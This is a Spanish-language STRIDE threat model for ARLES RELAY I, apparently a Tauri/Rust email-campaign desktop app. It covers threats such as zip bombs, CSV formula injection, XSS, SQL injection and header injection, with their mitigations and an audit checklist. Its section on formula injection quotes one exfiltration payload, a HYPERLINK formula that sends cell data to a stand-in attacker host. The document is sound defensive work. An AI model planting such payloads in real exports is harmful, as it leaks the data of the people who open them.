# Modelo de amenazas

**Proyecto:** ARLES RELAY I · v1.2.0
**Marco:** STRIDE · alineado con OWASP ASVS y Top 10 (§83)
**Fecha:** 2026-09-11

---

## 1. Qué protegemos

ARLES custodia tres activos, y conviene ordenarlos por lo que cuesta perderlos:

| Activo | Qué pasa si se compromete |
|---|---|
| **Datos personales de terceros** | Los contactos no son clientes nuestros ni del cliente: son personas que confiaron sus datos a alguien. Una filtración es un incidente bajo la LFPDPPP y afecta a gente que no eligió estar en nuestra base de datos |
| **Credenciales de correo** | Acceso a la cuenta de correo del cliente. Suplantación, lectura de su correspondencia, envío en su nombre |
| **Reputación del dominio del cliente** | El activo menos evidente y el más difícil de recuperar. Se destruye en días y se reconstruye en meses |

El tercero es el que se suele olvidar en un modelo de amenazas, y en ARLES es central: un atacante que consiga enviar basura desde la instalación de un cliente no roba datos — **destruye la capacidad de ese cliente de comunicarse por correo.**

## 2. Actores

| Actor | Capacidad | Motivación |
|---|---|---|
| **Atacante remoto** | Controla el contenido de archivos que el usuario importa; controla respuestas de servidores SMTP | Ejecución de código, exfiltración |
| **Atacante local** | Acceso al sistema de archivos del usuario | Datos personales, credenciales |
| **Usuario malicioso** | Usuario legítimo de ARLES | Enviar spam, evadir límites |
| **Insider del cliente** | Empleado con acceso a la aplicación | Exfiltrar la base de contactos |
| **Dependencia comprometida** | Código en el proceso | Cualquiera |

## 3. Superficies de entrada

Todo dato que entra desde fuera es no confiable. Las fuentes reales:

1. **Archivos XLSX y CSV importados** — la superficie más grande y la más subestimada
2. **Respuestas de servidores SMTP** — cadenas de longitud arbitraria de un servidor remoto
3. **Contenido que el usuario pega** en plantillas y firmas
4. **Archivos de respaldo `.arles`** restaurados
5. **Respuestas HTTP** del updater y de las consultas DNS

---

## 4. STRIDE por dominio

### 4.1 Importación (`arles-import`) — la superficie crítica

| Amenaza | Vector | Mitigación |
|---|---|---|
| **DoS** | Zip bomb en XLSX (un `.xlsx` es un ZIP) | **El archivo se descomprime primero contando y tirando los bytes**, con tope de `MAX_BYTES_DESCOMPRIMIDOS` (300 MB). Sólo si pasa se abre la hoja. Ver el aviso de abajo: la versión anterior de esta fila era falsa |
| **DoS** | 500 000 filas × celdas gigantes | Tope de celdas totales (8 000 000), tope de columnas (64), tope de bytes en disco (200 MB). **No hay tope por celda**: es una decisión consciente, anotada abajo |
| **DoS** | Filas vacías por delante de los encabezados | Se cuentan y se quitan de una vez. Quitarlas de una en una costaba el cuadrado de su número: 200 000 filas vacías colgaban la importación sin dar error |
| **Tampering** | Nombre de archivo malicioso (`../../`, dispositivos reservados de Windows, longitud extrema) | **El nombre suministrado nunca se usa para escribir en disco.** Se genera un UUID (`stored_filename`); el original se guarda como metadato |
| **Spoofing** | Nombre de archivo que **se dibuja al revés** (`U+202E` y demás caracteres de formato): `factura‮gnp.exe` se lee en pantalla como `facturaexe.png` | Se quitan los caracteres de control y de formato del nombre antes de guardarlo, y se recorta a 120 caracteres. El registro de importación es la prueba de qué se importó; un nombre disfrazado no prueba nada |
| **Elevación** | Inyección de fórmulas CSV | Al importar **nada se evalúa jamás**. Al **exportar**, se antepone `'` a toda celda que empiece por `=`, `+`, `-`, `@`, tabulador o retorno de carro |
| **Elevación** | XXE en el XML del XLSX | `calamine` no resuelve entidades externas. Se verifica y se fija como requisito de la dependencia |
| **Info disclosure** | Rutas absolutas en mensajes de error | Los errores nunca incluyen rutas del sistema de archivos |

> ### ⚠ Lo que esta tabla decía y no era verdad
>
> Hasta el 18/09/2026 esta fila decía «lectura en **streaming** con `calamine`».
> **Era falso, y nadie lo había comprobado.** `calamine` construye la hoja
> entera en memoria antes de devolver la primera fila, así que el tope de celdas
> —que se contaba recorriendo filas— llegaba siempre tarde.
>
> Medido con un archivo construido a propósito (`crates/arles-import/tests/bomba.rs`):
>
> | | Antes | Después |
> |---|---|---|
> | Archivo en disco | 47 MB | 47 MB |
> | Celdas declaradas | 16 000 000 | 16 000 000 |
> | **Pico de memoria al leerlo** | **+1 586 MB** | **+0 MB** |
> | Error devuelto | `DemasiadosDatos` | `DemasiadosDatos` |
>
> Las dos columnas devuelven el mismo error. Ésa es exactamente la razón por la
> que el fallo llevaba ahí sin verse: **una prueba que sólo mirara el error
> habría pasado en las dos**. Hizo falta medir la memoria.
>
> En un equipo de 4 GB, «antes» no es un error: es la aplicación cerrándose con
> el trabajo del usuario dentro.
>
> **Regla que deja esto:** una mitigación que dependa de cómo se comporta una
> biblioteca por dentro no vale escrita — vale medida. Las demás filas de esta
> tabla que digan «la biblioteca no hace X» llevan su prueba en
> `crates/arles-import/tests/ataques.rs`.

> **Sobre el tope por celda, que no existe:** una sola celda de 50 MB pasa por
> debajo del tope de celdas —es una— y por debajo del de bytes. Se mide en
> `ataques.rs` y hoy **se acepta**: para hacer daño hay que tener ya un archivo
> de decenas de megabytes, que el tope de disco limita. Queda escrito aquí para
> que sea una decisión y no un olvido.

> **Sobre la inyección de fórmulas:** el riesgo real de ARLES no está en importar —nunca evaluamos nada— sino en **exportar**. Un contacto cuyo nombre sea `=HYPERLINK("http://malo.com?d="&A1,"Click")` es inofensivo dentro de ARLES y peligroso en cuanto alguien abre el CSV exportado en Excel. Por eso la neutralización va en la exportación.

### 4.2 Plantillas (`arles-template`)

| Amenaza | Vector | Mitigación |
|---|---|---|
| **Elevación** | Inyección de plantilla (SSTI) | Motor **no Turing-completo**: sustitución textual contra mapa cerrado. Sin condicionales, bucles ni helpers (ADR-0006) |
| **Elevación** | XSS en la previsualización de la webview | Sanitizado con `ammonia` (lista blanca) **en Rust**, al guardar y otra vez al renderizar. El saneamiento del frontend no es autoritativo |
| **Tampering** | Inyección de cabeceras de correo vía variables (CRLF) | Se rechazan `\r` y `\n` en todo valor que alimente una cabecera. Asunto y direcciones se validan estrictamente |
| **Spoofing** | Inyección de HTML en el correo enviado | Mismo sanitizado, aplicado **antes de enviar**, no sólo antes de mostrar |

> La doble sanitización —al guardar y al usar— es deliberada. Sanitizar sólo al guardar deja expuesto todo lo que ya está en la base de datos si algún día se encuentra un fallo en la lista blanca.

### 4.3 Base de datos (`arles-db`)

| Amenaza | Vector | Mitigación |
|---|---|---|
| **Elevación** | SQL injection | **Consultas parametrizadas siempre.** Los filtros dinámicos se construyen con un constructor tipado que sólo puede producir fragmentos parametrizados — nunca concatenación |
| **Info disclosure** | Base de datos leída desde disco | **SQLCipher** (T-3, ADR-0011) |
| **Info disclosure** | Clave maestra accesible | Llavero del SO. **Si no está disponible, la aplicación no arranca** — sin degradación a texto plano |
| **Tampering** | Migración maliciosa | Migraciones embebidas en el binario firmado. Copia de la base de datos antes de migrar |

### 4.4 Credenciales (`arles-app`, llavero)

| Amenaza | Vector | Mitigación |
|---|---|---|
| **Info disclosure** | Credenciales en disco | Sólo en el llavero. `email_account.credential_ref` es una referencia opaca |
| **Info disclosure** | Credenciales en registros | Tipo `Secret<T>` con `Debug`/`Display` redactados **+** capa de redacción obligatoria en `tracing`. Las dos cosas |
| **Info disclosure** | Credenciales cruzando la frontera IPC | **Ningún comando Tauri devuelve un secreto.** Se resuelven dentro de Rust en el momento del uso |
| **Spoofing** | Robo de token OAuth por webview embebida | Autenticación en el **navegador del sistema**, nunca embebida (v1.2.x) |
| **Info disclosure** | Respaldo `.arles` sin cifrar | ⚠️ **Riesgo aceptado en v1.2.0** (T-6). Las credenciales **no se incluyen** en el respaldo; los datos personales sí. Se advierte al usuario |

### 4.5 Shell de Tauri (`arles-app`)

| Amenaza | Vector | Mitigación |
|---|---|---|
| **Elevación** | XSS → acceso al sistema de archivos | **Capabilities denegadas por defecto.** Sin plugin `shell`. Sin `fs` amplio. Sólo el diálogo de archivos con alcance acotado |
| **Elevación** | Ejecución de script inyectado | **CSP estricta, sin excepciones**: `script-src 'self'` y `style-src 'self'`, sin `unsafe-inline`, sin `unsafe-eval`, sin orígenes remotos. Verificado ejercitando la aplicación bajo esa política (`app/pruebas/sondas/csp.mjs`) |
| **Tampering** | Actualización maliciosa | Verificación de **firma criptográfica** antes de aplicar (§79). Clave pública empaquetada; la privada nunca entra al repositorio |
| **Elevación** | Navegación a origen externo | Navegación restringida. Los enlaces externos se abren en el navegador del sistema, no en la webview |

> El argumento de ADR-0001 se concreta aquí: en Electron, una inyección de HTML en una plantilla estaría a un `require('child_process')` del sistema. En Tauri, con las capabilities denegadas, **esa capacidad no existe en el proceso**.

### 4.6 Motor de ejecución (`arles-engine`)

| Amenaza | Vector | Mitigación |
|---|---|---|
| **Repudio** | Negar haber activado una campaña | `audit_log` append-only, con la aceptación del aviso de más de 50 diarios registrada (§48) |
| **DoS al destinatario** | Duplicados masivos por fallo | `UNIQUE(campaign_id, contact_id)` + CAS + política `presumed_sent` (ADR-0004) |
| **Abuso** | Usar ARLES para spam | Sin rotación de remitentes (T-1) · supresión obligatoria · aviso de volumen · límites del proveedor respetados |
| **DoS** | Respuesta SMTP de longitud arbitraria | Tope de bytes al leer respuestas; timeouts en todas las operaciones de red |
| **Tampering** | Escalada de privilegios vía servidor SMTP malicioso | Las respuestas del servidor se tratan como datos no confiables: nunca se interpolan en consultas, plantillas ni rutas |

### 4.7 Supresión (`arles-suppression`)

| Amenaza | Vector | Mitigación |
|---|---|---|
| **Tampering** | Una importación borra supresiones | **Estructural:** la importación no tiene camino de código que elimine entradas de supresión (§39) |
| **Bypass** | Baja entre el cálculo de audiencia y el envío | Comprobación **en el momento del envío**, no sólo al construir la audiencia |
| **Bypass** | Borrar y reimportar el contacto | La clave de supresión es `email_normalized`, **no `contact_id`** |

---

## 5. Principio de mínimo privilegio (§87)

| Dónde | Aplicación |
|---|---|
| Scopes de OAuth | `gmail.send` y nada más. Sin lectura de bandeja (§69) |
| Capabilities de Tauri | Denegar por defecto; habilitar lo mínimo por ventana |
| Sistema de archivos | Sólo directorios estándar de la plataforma. Sin rutas arbitrarias |
| Red | Sólo SMTP saliente, DNS y el endpoint del updater |
| Base de datos | Sin usuarios: es local. El aislamiento lo da el cifrado |

---

## 6. Registro y auditoría

**Nunca en los registros:** contraseñas, tokens, la clave maestra, el cuerpo íntegro de mensajes, contenido de archivos importados.

**Direcciones de correo en los registros:** son datos personales bajo la LFPDPPP. Se registran sólo cuando son necesarias para diagnosticar, con **retención acotada y rotación**. No se guardan indefinidamente.

**`audit_log` no es un registro.** Vive en la base de datos, es append-only y registra hechos de negocio. Un registro se rota y se borra; la bitácora no.

---

## 7. Riesgos aceptados

Decisiones conscientes, no descuidos:

| Riesgo | Por qué se acepta | Compensación |
|---|---|---|
| **Respaldo `.arles` sin cifrar** | T-6 difiere el cifrado a v1.3 | Sin credenciales dentro. Advertencia explícita al usuario |
| **Detección de rebotes parcial** | Contradicción §37/§69 (ADR-0009) | Declarado en la interfaz |
| **El «client secret» de Google es extraíble** | Inherente a las aplicaciones instaladas (RFC 8252) | PKCE aporta la seguridad real. No se documenta como secreto verdadero |
| **Un usuario legítimo puede enviar spam** | ARLES no puede verificar el consentimiento de los contactos | Afirmación de origen lícito registrada · sin rotación de remitentes · avisos |
| **Pérdida de la clave maestra = datos irrecuperables** | Es la propiedad buscada del cifrado | Advertencia en el primer arranque · respaldo como vía de recuperación |

### 7.1 Riesgos cerrados

**`style-src 'unsafe-inline'` — retirado en la Fase 2.**

La Fase 1 lo dejó aquí como riesgo aceptado, con el argumento de que los
estilos *scoped* de Vue se inyectan en tiempo de ejecución y sin
`unsafe-inline` la interfaz se quedaría sin estilos.

El argumento resultó cierto **sólo en el modo de desarrollo**. En la
aplicación empaquetada:

- Vite extrae las hojas de los componentes a un `.css` servido desde `'self'`.
- Los enlaces `:style` de Vue se aplican con `element.style.setProperty()`,
  que la CSP **no gobierna**: la directiva alcanza al atributo `style=` del
  HTML y a las etiquetas `<style>`, no a la API del DOM.

Medido sirviendo el build bajo la política exacta de `tauri.conf.json` y
recorriendo la tabla virtualizada, el modal y el menú —las tres primitivas
que usan estilo en línea—: **cero violaciones**. `style-src` pasó a `'self'`.

`app/index.html` conserva `'unsafe-inline'` en su `<meta>` porque `vite dev`
sí inyecta `<style>`. Cuando las dos políticas coinciden —la aplicación
instalada— **gana la intersección**, así que lo que llega a la máquina del
cliente no admite estilo en línea. La sonda `csp.mjs` lo comprueba cada vez.

La lección que deja: **un riesgo aceptado sin medir es una suposición con
formato de decisión.** Éste llevaba una fase entero y costaba veinte minutos
de comprobación.

---

## 8. Qué verificar en la auditoría de seguridad (§140-B)

- [ ] Ninguna cadena de consulta se construye por concatenación
- [ ] `Secret<T>` envuelve todo secreto; la capa de redacción de `tracing` está activa
- [ ] Ningún comando Tauri devuelve una credencial
- [ ] Capabilities denegadas por defecto; sin `shell`; `fs` acotado
- [x] CSP sin `unsafe-inline` ni `unsafe-eval` — verificado en la Fase 2 ejercitando la aplicación bajo la política del producto (`sonda:csp`)
- [x] Ningún campo de entrada ofrece autocompletado ni corrector por defecto: las credenciales no pueden acabar en el gestor de contraseñas de la webview (§30)
- [ ] Sanitizado HTML en Rust, al guardar **y** al usar
- [x] Topes de zip bomb, filas, celdas y nombre verificados **con archivos reales construidos a propósito** — 13 ataques en `crates/arles-import/tests/ataques.rs` y `bomba.rs` (18/09/2026). El de la bomba mide el **pico de memoria**, no sólo el error: sin eso, la defensa rota pasaba la prueba
- [ ] Neutralización de fórmulas en la **exportación** CSV
- [ ] La aplicación se niega a arrancar sin llavero (probado, no supuesto)
- [ ] Las respuestas SMTP se tratan como no confiables
- [ ] Verificación de firma del updater probada con una actualización manipulada
- [ ] `audit_log` sin caminos de `UPDATE` ni `DELETE`
- [ ] Auditoría de dependencias (`cargo audit`, `npm audit`) en CI
